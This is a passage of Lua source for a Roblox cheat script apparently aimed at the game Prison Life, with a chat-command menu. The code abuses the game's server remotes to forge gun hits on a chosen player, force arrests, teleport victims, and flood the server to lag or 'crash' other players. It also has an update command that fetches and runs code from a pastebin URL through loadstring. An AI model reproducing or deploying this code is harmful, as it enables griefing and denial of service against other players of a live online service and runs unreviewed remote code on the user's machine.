			if game.Players.LocalPlayer.TeamColor.Name ~= "Bright blue" or not Gun then
				savedteam = GetTeam()
				workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new("Bright blue").Name)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
				changedteam = true
			end

			local Guns = game.Players.LocalPlayer.Backpack:FindFirstChild("Taser") or game.Players.LocalPlayer.Character:FindFirstChild("Taser")

			local TaseEvent = 
				{
					[1] = 
					{
						["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
						["Distance"] = 0, 
						["Cframe"] = CFrame.new(), 
						["Hit"] = workspace[Player.Name].Torso
					}
				}

			game:GetService("ReplicatedStorage").ShootEvent:FireServer(TaseEvent, Guns)
			if changedteam then
				workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new(savedteam).Name)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
			end
		end)
	end

	function Teleport(Player, Position)
		if Player == nil or Position == nil then return end
		local savedcf = GetPos()
		workspace.Remote.loadchar:InvokeServer()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
		workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP)
		local CHAR = game.Players.LocalPlayer.Character
		CHAR.Humanoid.Name = "1"
		local c = CHAR["1"]:Clone()
		c.Name = "Humanoid"
		c.Parent = CHAR
		CHAR["1"]:Destroy()
		game.Workspace.CurrentCamera.CameraSubject = CHAR
		CHAR.Animate.Disabled = true
		wait()
		CHAR.Animate.Disabled = false
		CHAR.Humanoid.DisplayDistanceType = "None"
		game.Players.LocalPlayer:FindFirstChild("Backpack"):FindFirstChild("M9").Parent = CHAR
		local STOP = 0
		repeat wait(.1)
			STOP = STOP + 1
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Player.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 0.75)
		until (not game.Players.LocalPlayer.Character:FindFirstChild("M9") or not game.Players.LocalPlayer.Character.HumanoidRootPart or not Player.Character.HumanoidRootPart or not game.Players.LocalPlayer.Character.HumanoidRootPart.Parent or not Player.Character.HumanoidRootPart.Parent or STOP > 500) and STOP > 3
		local STOP_2 = 0
		repeat wait()
			STOP_2 = STOP_2 + 1
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Position
		until STOP_2 > 10
		workspace.Remote.loadchar:InvokeServer()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
	end

	function TeleportV(Player, Player2)
		if Player == nil or Player2 == nil then return end
		local savedcf = GetPos()
		workspace.Remote.loadchar:InvokeServer()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
		workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP)
		local CHAR = game.Players.LocalPlayer.Character
		CHAR.Humanoid.Name = "1"
		local c = CHAR["1"]:Clone()
		c.Name = "Humanoid"
		c.Parent = CHAR
		CHAR["1"]:Destroy()
		game.Workspace.CurrentCamera.CameraSubject = CHAR
		CHAR.Animate.Disabled = true
		wait()
		CHAR.Animate.Disabled = false
		CHAR.Humanoid.DisplayDistanceType = "None"
		game.Players.LocalPlayer:FindFirstChild("Backpack"):FindFirstChild("M9").Parent = CHAR
		local STOP = 0
		repeat wait(.1)
			STOP = STOP + 1
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Player.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 0.75)
		until (not game.Players.LocalPlayer.Character:FindFirstChild("M9") or not game.Players.LocalPlayer.Character.HumanoidRootPart or not Player.Character.HumanoidRootPart or not game.Players.LocalPlayer.Character.HumanoidRootPart.Parent or not Player.Character.HumanoidRootPart.Parent or STOP > 500) and STOP > 3
		local STOP_2 = 0
		repeat wait()
			STOP_2 = STOP_2 + 1
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Player2.Character.HumanoidRootPart.CFrame
		until STOP_2 > 10
		workspace.Remote.loadchar:InvokeServer()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
	end

	function ArrestEvent(Player, Time)
		for i = 1,Time do
			workspace.Remote.arrest:InvokeServer(Player.Character.Head)
		end
	end

	function Arrest(Player, Time)
		local Time = Time or 1
		local savedcf = GetPos()
		local savedcamcf = GetCamPos()
		local savedteam = GetTeam()
		if Player then
			repeat wait()
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Player.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 1)
				for i = 1,Time do
					coroutine.wrap(function()
						workspace.Remote.arrest:InvokeServer(Player.Character.Head)
					end)()
				end
			until Player.Character:FindFirstChild("Head"):FindFirstChild("handcuffedGui")
			wait()
		end
		workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new(savedteam).Name)
		game.Players.LocalPlayer.Character.Humanoid.Sit = false
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
		workspace.CurrentCamera.CFrame = savedcamcf
	end

	function CreateBeam(Player, Distance, Position)
		if Player then
			pcall(function()
				local Backpack = game.Players.LocalPlayer.Backpack
				local Character = game.Players.LocalPlayer.Character
				local Gun = Backpack:FindFirstChild("Remington 870") or Character:FindFirstChild("Remington 870")
				if not Gun then
					workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
				end
				Gun = Backpack:FindFirstChild("Remington 870") or Character:FindFirstChild("Remington 870")
				local Head = Player.Character.Head
				if Head and Player and Character and Backpack and Gun and Distance and Position then
					game.ReplicatedStorage.ShootEvent:FireServer({
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head}
					}, Gun)
				end
				Gun.Parent = game.Players.LocalPlayer.Character
				game.Players.LocalPlayer.Character:FindFirstChild("Remington 870"):Destroy()
			end)
		end
	end

	function CreateBeam2(Player, Distance, Position)
		if Player then
			pcall(function()
				local Backpack = game.Players.LocalPlayer.Backpack
				local Character = game.Players.LocalPlayer.Character
				local Gun = Backpack:FindFirstChild("AK-47") or Character:FindFirstChild("AK-47")
				if not Gun then
					workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["AK-47"].ITEMPICKUP)
				end
				Gun = Backpack:FindFirstChild("AK-47") or Character:FindFirstChild("AK-47")
				local Head = Player.Character.Head
				if Head and Player and Character and Backpack and Gun and Distance and Position then
					game.ReplicatedStorage.ShootEvent:FireServer({
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
					}, Gun)
				end
				Gun.Parent = game.Players.LocalPlayer.Character
				game.Players.LocalPlayer.Character:FindFirstChild("AK-47"):Destroy()
			end)
		end
	end

	function CreateBeam3(Player, Distance, Position)
		if Player then
			pcall(function()
				local Backpack = game.Players.LocalPlayer.Backpack
				local Character = game.Players.LocalPlayer.Character
				local Gun = Backpack:FindFirstChild("M9") or Character:FindFirstChild("M9")
				if not Gun then
					workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP)
				end
				Gun = Backpack:FindFirstChild("M9") or Character:FindFirstChild("M9")
				local Head = Player.Character.Head
				if Head and Player and Character and Backpack and Gun and Distance and Position then
					game.ReplicatedStorage.ShootEvent:FireServer({
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head}
					}, Gun)
				end
				Gun.Parent = game.Players.LocalPlayer.Character
				game.Players.LocalPlayer.Character:FindFirstChild("M9"):Destroy()
			end)
		end
	end

	function Beam(Player, Distance, Time)
		if Player and Distance then
			local RunService = game:GetService("RunService")
			RunService:BindToRenderStep(Player.Name, math.huge, function()
				coroutine.wrap(function()
					CreateBeam(Player, Distance, Player.Character.HumanoidRootPart.CFrame)
				end)()
			end)
			delay(Time, function()
				pcall(function()
					RunService:UnbindFromRenderStep(Player.Name)
				end)
			end)
		end
	end

	function LagBeam(Player, Distance, Time)
		if Player and Distance then
			local RunService = game:GetService("RunService")
			RunService:BindToRenderStep(Player.Name, math.huge, function()
				coroutine.wrap(function()
					CreateBeam(Player, Distance, Player.Character.HumanoidRootPart.CFrame)
				end)()
				coroutine.wrap(function()
					CreateBeam2(Player, Distance, Player.Character.HumanoidRootPart.CFrame)
				end)()
				coroutine.wrap(function()
					CreateBeam3(Player, Distance, Player.Character.HumanoidRootPart.CFrame)
				end)()
			end)
			delay(Time, function()
				pcall(function()
					RunService:UnbindFromRenderStep(Player.Name)
				end)
			end)
		end
	end

	function DetectMove(Player)
		local oldpos = Player.Character.HumanoidRootPart.CFrame
		local Move
		local Time = 0
		repeat wait(.1)
			Time = Time + 1
			if oldpos ~= Player.Character.HumanoidRootPart.CFrame then
				Move = true
			else
				Move = false
			end
		until (Time >= 500 and Move == false) or Move == true
		return Move
	end

	function FeGodMode()
		game.Players.LocalPlayer.Character.Humanoid.Name = 1
		local l = game.Players.LocalPlayer.Character["1"]:Clone()
		l.Parent = game.Players.LocalPlayer.Character
		l.Name = "Humanoid"
		game.Players.LocalPlayer.Character.Animate.Disabled = true
		wait()
		game.Players.LocalPlayer.Character.Animate.Disabled = false
		game.Players.LocalPlayer.Character["1"]:Destroy()
		game.Workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character
	end

	local function GetPlayerPart(Player)
		if not Player then return end
		if Player:FindFirstChild("HumanoidRootPart") then
			return Player.HumanoidRootPart
		elseif Player:FindFirstChild("Torso") then
			return Player.Torso
		end
	end

	local Mouse = game.Players.LocalPlayer:GetMouse()

	function CopyChat(Player)
		Player.Chatted:Connect(function(Message)
			if States.CopyChat then
				Chat("["..Player.DisplayName.."]: "..Message)
			end
		end)
	end

	function Died(Player)
		pcall(function()
			if Player.Character.Humanoid.Health < 1 then
				if States.ChatNotify then
					Chat(Player.DisplayName.." Died")
				end
				if States.Notify then
					game.StarterGui:SetCore("SendNotification", {
						Title = "Game",
						Text = Player.DisplayName.." Died",
						Icon = game.Players:GetUserThumbnailAsync(Player.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size352x352)
					})
				end
			end
		end)
	end

	function PlayerPickUp(Player)
		Player.Backpack.ChildAdded:Connect(function(Item)
			if States.ChatNotify then
				Chat(Player.DisplayName.." Pick Up "..Item.Name)
			end
			if States.Notify then
				game.StarterGui:SetCore("SendNotification", {
					Title = "Game",
					Text = Player.DisplayName.." Pick Up "..Item.Name,
					Icon = game.Players:GetUserThumbnailAsync(Player.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size352x352)
				})
			end
		end)
	end

	local function Notify(Message, Color, Text)
		Notify6.Text = Notify5.Text
		Notify6.TextColor3 = Notify5.TextColor3
		Notify5.Text = Notify4.Text
		Notify5.TextColor3 = Notify4.TextColor3
		Notify4.Text = Notify3.Text
		Notify4.TextColor3 = Notify3.TextColor3
		Notify3.Text = Notify2.Text
		Notify3.TextColor3 = Notify2.TextColor3
		Notify2.Text = Notify1.Text
		Notify2.TextColor3 = Notify1.TextColor3
		Notify1.Text = "["..Text.."] "..Message
		Notify1.TextColor3 = Color or Color3.fromRGB(255, 255, 255)
	end

	local function Loadstring(Https)
		if not Https then return end
		loadstring(game:HttpGet((Https), true))()
	end

	local function Command(Cmd)
		return Arg1 == Prefix..Cmd
	end

	local function PrefixCommand(Cmd)
		return Arg1 == "!"..Cmd
	end

	local Walls = {
		game.Workspace.Prison_Halls.walls,
		game.Workspace.Prison_Halls.roof,
		game.Workspace.Prison_Halls.outlines,
		game.Workspace.Prison_Halls.lights,
		game.Workspace.Prison_Halls.accent,
		game.Workspace.Prison_Halls.glass,
		game.Workspace.Prison_Cellblock.b_front,
		game.Workspace.Prison_Cellblock.doors,
		game.Workspace.Prison_Cellblock.c_tables,
		game.Workspace.Prison_Cellblock.a_front,
		game.Workspace.Prison_Cellblock.b_outerwall,
		game.Workspace.Prison_Cellblock.c_wall,
		game.Workspace.Prison_Cellblock.b_wall,
		game.Workspace.Prison_Cellblock.c_hallwall,
		game.Workspace.Prison_Cellblock.a_outerwall,
		game.Workspace.Prison_Cellblock.b_ramp,
		game.Workspace.Prison_Cellblock.a_ramp,
		game.Workspace.Prison_Cellblock.a_walls,
		game.Workspace.Prison_Cellblock.Cells_B,
		game.Workspace.Prison_Cellblock.Cells_A,
		game.Workspace.Prison_Cellblock.c_corner,
		game.Workspace.Prison_Cellblock.Wedge,
		game.Workspace.Prison_Cellblock.a_ceiling,
		game.Workspace.Prison_Cellblock.b_ceiling,
		game.Workspace.City_buildings,
		game.Workspace.Prison_OuterWall,
		game.Workspace.Prison_Fences,
		game.Workspace.Prison_Guard_Outpost,
		game.Workspace.Prison_Cafeteria.building,
		game.Workspace.Prison_Cafeteria.glass,
		game.Workspace.Prison_Cafeteria.oven,
		game.Workspace.Prison_Cafeteria.shelves,
		game.Workspace.Prison_Cafeteria.vents,
		game.Workspace.Prison_Cafeteria.accents,
		game.Workspace.Prison_Cafeteria["vending machine"],
		game.Workspace.Prison_Cafeteria.Prison_table1,
		game.Workspace.Prison_Cafeteria.counter,
		game.Workspace.Prison_Cafeteria.boxes,
		game.Workspace.Prison_Cafeteria["trash bins"]
	}

--[[if not Slient then
	Chat("Admin Commands By LocalPlayer   #   7434")
	Chat("Admin Commands Version "..Versions)
	Chat("Current Prefix Is "..Prefix)
	wait()
	Chat("Admin Commands Loaded!")
else
	Chat("Loaded")
	Chat("P "..Prefix)
	Chat("V "..Versions)
end]]

	Notify("Loaded admin commands", Color3.fromRGB(0, 255, 0), "Loads")

	function PlayerChatted(Message)
		if ScriptDisabled then return end
		Split = Message:split(" ")
		Arg1 = Split[1]
		Arg2 = Split[2]
		Arg3 = Split[3]
		Arg4 = Split[4]
		if Command("unload") or Command("destroygui") then
			Notify("Unloading...", Color3.fromRGB(0, 255, 255), "Unloads")
			wait(.1)
			pcall(function()
				CmdGui:Destroy()
				States = {}
				LoopKill = {}
				LoopTase = {}
				Admin = {}
				ScriptDisabled = true
				for i,v in pairs(game.Lighting:GetChildren()) do
					v.Parent = workspace
				end
			end)
		end
		if Command("reload") or Command("update") then
			Notify("Updating versions...", Color3.fromRGB(0, 255, 255), "Updates")
			pcall(function()
				CmdGui:Destroy()
				States = {}
				LoopKill = {}
				LoopTase = {}
				Admin = {}
				ScriptDisabled = true
				for i,v in pairs(game.Lighting:GetChildren()) do
					v.Parent = workspace
				end
			end)
			Loadstring("https://pastebin.com/raw/9ab2s523")
		end
		if Command("beam") then
			local Player = GetPlayer(Arg2)
			if Player then
				Beam(Player, math.huge, 7)
				Notify("Beamed "..Player.Name, Color3.fromRGB(0, 255, 0), "Success")
			else
				Notify("No player found", Color3.fromRGB(255, 0, 0), "Error")
			end
		end
		if Command("lagbeam") or Command("beam2") then
			local Player = GetPlayer(Arg2)
			if Player then
				LagBeam(Player, math.huge, 7)
				Notify("Lag beamed "..Player.Name, Color3.fromRGB(255, 0, 0), "Success")
			else
				Notify("No player found", Color3.fromRGB(255, 0, 0), "Error")
			end
		end
		if Command("crash") or Command("beam3") then
			local Player = GetPlayer(Arg2)
			if Player then
				LagBeam(Player, math.huge, 9000)
				Notify("Crashed "..Player.Name, Color3.fromRGB(0, 255, 0), "Success")
			else
				Notify("No player found", Color3.fromRGB(255, 0, 0), "Error")
			end
		end
		if Command("antispamarrest") then
			States.Anti_Spam_Arrest = true
			Notify("Turn anti spam arrest on", Color3.fromRGB(0, 255, 0), "Success")
			while wait() do
				if States.Anti_Spam_Arrest then
					pcall(function()
						if game.Players.LocalPlayer.Character.Head:FindFirstChild("handcuffedGui") then
							repeat wait()
								coroutine.wrap(function()
									game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(888, 100, 2388)
									workspace.Remote.TeamEvent:FireServer("Medium stone grey")
									workspace.Remote.TeamEvent:FireServer("Bright blue")
								end)()
							until game.Players.LocalPlayer.TeamColor.Name == "Bright blue"
							wait(.1)
							for i = 1,10 do
								workspace.Remote.TeamEvent:FireServer("Medium stone grey")
							end
						end
					end)
				end
			end
		end
		if Command("unantispamarrest") then
			States.Anti_Spam_Arrest = false
			Notify("Turn anti spam arrest off", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("inmate") or Command("inmates") or Command("prisoner") or Command("prisoners") then
			workspace.Remote.TeamEvent:FireServer("Bright orange")
			Notify("Become inmate", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("guard") or Command("guards") or Command("cop") or Command("polices") or Command("cops") then
			workspace.Remote.TeamEvent:FireServer("Bright blue")
			if game.Players.LocalPlayer.TeamColor.Name == "Bright blue" then
				Notify("Become guard", Color3.fromRGB(0, 255, 0), "Success")
			else
				Notify("Fulled team", Color3.fromRGB(255, 0, 0), "Error")
			end
		end
		if Command("gun") or Command("guns") or Command("allguns") then
			if BuyGamepass then
				workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
				workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M4A1"].ITEMPICKUP)
				workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["AK-47"].ITEMPICKUP)
				workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP)
			else
				workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
				workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["AK-47"].ITEMPICKUP)
				workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP)
			end
			Notify("Get all guns", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("autogun") or Command("autoguns") or Command("autoallguns") then
			States.Auto_Guns = true
			Notify("Turn auto guns on", Color3.fromRGB(0, 255, 0), "Success")
			if BuyGamepass then
				workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
				workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M4A1"].ITEMPICKUP)
				workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["AK-47"].ITEMPICKUP)
				workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP)
			else
				workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
				workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["AK-47"].ITEMPICKUP)
				workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP)
			end
			game.Players.LocalPlayer.CharacterAdded:Connect(function()
				if States.Auto_Guns then
					pcall(function()
						if BuyGamepass then
							workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
							workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M4A1"].ITEMPICKUP)
							workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["AK-47"].ITEMPICKUP)
							workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP)
						else
							workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
							workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["AK-47"].ITEMPICKUP)
							workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP)
						end
					end)
				end
			end)
		end
		if Command("unautogun") or Command("unautoguns") or Command("unautoallguns") then
			States.Auto_Guns = false
			Notify("Turn auto guns off", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("loopgoto") or Command("loopto") then
			local Player = GetPlayer(Arg2)
			if Player then
				States.LoopGoto = true
				repeat wait()
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Player.Character.HumanoidRootPart.CFrame
				until not States.LoopGoto or not game.Players[Player.Name]
			end
		end
		if Command("unloopgoto") or Command("unloopto") then
			States.LoopGoto = false
		end
		if Command("checkscriptowner") or Command("findowner") then
			for i,v in pairs(game.Players:GetPlayers()) do
				if v.DisplayName == "Hack" and v.Name == "ih4xalots" then
					ChatNotify("Script owner : "..v.Name.." / "..v.DisplayName, Color3.fromRGB(0, 255, 0))
				end
			end
		end
		if Command("getplayer") or Command("getplayers") then
			ChatNotify("Players : "..#game.Players:GetPlayers(), Color3.fromRGB(255, 255, 255))
		end
		if Command("autofire") then
			if game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool"):FindFirstChild("GunStates") then
				local Gun = require(game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").GunStates)
				Gun["AutoFire"] = true
				Notify("Turn auto fire", Color3.fromRGB(0, 255, 0), "Success")
			else
				Notify("Equip a gun", Color3.fromRGB(255, 0, 0), "Error")
			end
		end
		if Command("semifire") then
			if game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool"):FindFirstChild("GunStates") then
				local Gun = require(game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").GunStates)
				Gun["AutoFire"] = false
				Notify("Turn semi fire", Color3.fromRGB(0, 255, 0), "Success")
			else
				Notify("Equip a gun", Color3.fromRGB(255, 0, 0), "Error")
			end
		end
		if Command("firespeed") or Command("setfirespeed") then
			if game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool"):FindFirstChild("GunStates") then
				local Gun = require(game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").GunStates)
				if tonumber(Arg2) ~= nil then
					Gun["FireRate"] = tonumber(Arg2)
					Notify("Set a gun fire speed to "..tonumber(Arg2), Color3.fromRGB(0, 255, 0), "Success")
				else
					Notify("Counts needed", Color3.fromRGB(255, 0, 0), "Error")
				end
			else
				Notify("Equip a gun", Color3.fromRGB(255, 0, 0), "Error")
			end
		end
		if Command("burst") or Command("burstbullets") or Command("bullets") then
			if game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool"):FindFirstChild("GunStates") then
				local Gun = require(game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").GunStates)
				if tonumber(Arg2) ~= nil then
					Gun["Bullets"] = tonumber(Arg2)
					Notify("Set a gun burst bullets to "..tonumber(Arg2), Color3.fromRGB(0, 255, 0), "Success")
				else
					Notify("Counts needed", Color3.fromRGB(255, 0, 0), "Error")
				end
			else
				Notify("Equip a gun", Color3.fromRGB(255, 0, 0), "Error")
			end
		end
		if Command("reloadtime") or Command("reloadtimes") then
			if game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool"):FindFirstChild("GunStates") then
				local Gun = require(game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").GunStates)
				if tonumber(Arg2) ~= nil then
					Gun["ReloadTime"] = tonumber(Arg2)
					Notify("Set a gun reload time to "..tonumber(Arg2), Color3.fromRGB(0, 255, 0), "Success")
				else
					Notify("Counts needed", Color3.fromRGB(255, 0, 0), "Error")
				end
			else
				Notify("Equip a gun", Color3.fromRGB(255, 0, 0), "Error")
			end
		end
